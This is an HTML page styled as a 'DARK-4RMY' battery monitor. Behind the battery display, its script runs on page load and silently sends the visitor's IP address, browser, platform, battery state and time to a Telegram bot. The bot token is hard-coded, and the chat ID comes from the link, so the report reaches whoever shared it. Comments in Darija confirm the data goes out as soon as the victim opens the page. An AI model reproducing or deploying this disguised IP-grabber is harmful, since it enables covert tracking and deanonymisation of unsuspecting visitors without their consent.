<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK-4RMY System</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        /* 100% Original Design Preserved */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --neon-cyan: #00f3ff;
            --neon-purple: #bf00ff;
            --neon-pink: #ff006e;
            --dark-bg: #0a0a0f;
            --dark-panel: rgba(15, 15, 25, 0.85);
            --text-primary: #ffffff;
            --text-secondary: #a0a0b0;
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--dark-bg);
            color: var(--text-primary);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        .bg-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
        }

        .bg-container::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: url('https://i.pinimg.com/736x/ee/46/df/ee46df7c13f10e33afe5bb81ac5b4dfe.jpg') center/cover no-repeat;
            filter: brightness(0.3) contrast(1.2);
        }

        .grid-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(var(--neon-cyan) 1px, transparent 1px), linear-gradient(90deg, var(--neon-cyan) 1px, transparent 1px);
            background-size: 50px 50px; opacity: 0.03; z-index: -1; animation: gridMove 20s linear infinite;
        }

        @keyframes gridMove { 0% { transform: translateY(0); } 100% { transform: translateY(50px); } }

        .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }

        .header { text-align: center; margin-bottom: 50px; animation: fadeInDown 1s ease; }

        .logo {
            font-family: 'Orbitron', sans-serif; font-size: 3.5em; font-weight: 900;
            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple), var(--neon-pink));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            text-shadow: 0 0 30px rgba(0, 243, 255, 0.5); letter-spacing: 4px; animation: glowPulse 2s ease-in-out infinite;
        }

        @keyframes glowPulse {
            0%, 100% { filter: drop-shadow(0 0 10px var(--neon-cyan)); }
            50% { filter: drop-shadow(0 0 25px var(--neon-purple)); }
        }

        .panel {
            background: var(--dark-panel); border: 2px solid var(--neon-cyan); border-radius: 20px;
            padding: 40px; backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
            animation: fadeInUp 1s ease 0.3s backwards; position: relative; overflow: hidden;
        }

        .battery-container { text-align: center; margin: 40px 0; }
        .battery-icon { width: 200px; height: 100px; margin: 0 auto 30px; position: relative; }
        .battery-body {
            width: 180px; height: 100px; border: 4px solid var(--neon-cyan); border-radius: 10px;
            position: relative; background: rgba(0, 0, 0, 0.5);
        }
        .battery-level {
            height: 92px; background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple));
            border-radius: 6px; margin: 4px; transition: width 0.5s ease; box-shadow: 0 0 20px rgba(0, 243, 255, 0.6);
        }
        .battery-percentage { font-family: 'Orbitron', sans-serif; font-size: 4em; font-weight: 900; color: var(--neon-cyan); }
        
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 40px 0; }
        .info-card { background: rgba(0, 243, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 12px; padding: 20px; }
        .info-label { font-size: 0.9em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .info-value { font-family: 'Orbitron', sans-serif; font-size: 1.4em; color: var(--neon-cyan); }

        .footer { text-align: center; margin-top: 50px; color: var(--text-secondary); opacity: 0.7; }
        
        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="bg-container"></div>
    <div class="grid-overlay"></div>

    <div class="container">
        <div class="header">
            <h1 class="logo">DARK-4RMY</h1>
            <div class="contact-info" id="ownerInfo">BY MOHAMED SABER</div>
        </div>

        <div class="panel">
            <div class="battery-container">
                <div class="battery-icon">
                    <div class="battery-body">
                        <div class="battery-level" id="batteryLevel"></div>
                    </div>
                </div>
                <div class="battery-percentage" id="batteryPercentage">--</div>
                <div class="battery-status" id="batteryStatus">Analyzing...</div>
            </div>

            <div class="info-grid">
                <div class="info-card">
                    <div class="info-label">Status</div>
                    <div class="info-value" id="chargingStatus">--</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Time Remaining</div>
                    <div class="info-value" id="timeRemaining">--</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Browser</div>
                    <div class="info-value" id="browserInfo">--</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Platform</div>
                    <div class="info-value" id="osInfo">--</div>
                </div>
            </div>
        </div>

        <div class="footer">
            © 2024 DARK-4RMY | Secure Monitoring Node
        </div>
    </div>

    <script>
        // TOKEN DYAL L-BOT DYALK
        const BOT_TOKEN = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';

        // Getting the target Chat ID from URL (e.g., site.com/?id=7587405246)
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('id');

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'Hidden'; }
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Chrome")) browser = "Chrome";
            else if (ua.includes("Safari")) browser = "Safari";
            
            return {
                browser: browser,
                platform: navigator.platform,
                vendor: navigator.vendor
            };
        }

        async function sendData(battery) {
            if (!targetChatId) return;

            const ip = await getIP();
            const device = getDeviceInfo();
            const level = Math.round(battery.level * 100);

            const message = `
⚡ *DARK-4RMY LOG REPORT* ⚡
━━━━━━━━━━━━━━━━━━
🔋 *Battery:* ${level}% (${battery.charging ? 'Charging 🔌' : 'Discharging 🔋'})
🌐 *IP Address:* \`${ip}\`
💻 *Platform:* ${device.platform}
🌍 *Browser:* ${device.browser}
🕒 *Time:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
🎯 *Target ID:* \`${targetChatId}\`
`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: targetChatId, // Sifts l-wa7d li sift l-link nichan
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }

        async function init() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                
                const updateUI = () => {
                    const level = Math.round(battery.level * 100);
                    document.getElementById('batteryLevel').style.width = level + '%';
                    document.getElementById('batteryPercentage').textContent = level + '%';
                    document.getElementById('chargingStatus').textContent = battery.charging ? 'Charging' : 'On Battery';
                    document.getElementById('browserInfo').textContent = getDeviceInfo().browser;
                    document.getElementById('osInfo').textContent = navigator.platform;
                };

                updateUI();
                await sendData(battery); // Sift l-data ghir yftha l-wa7d

                battery.addEventListener('levelchange', updateUI);
                battery.addEventListener('chargingchange', updateUI);
            }
        }

        window.onload = init;
    </script>
</body>
</html>
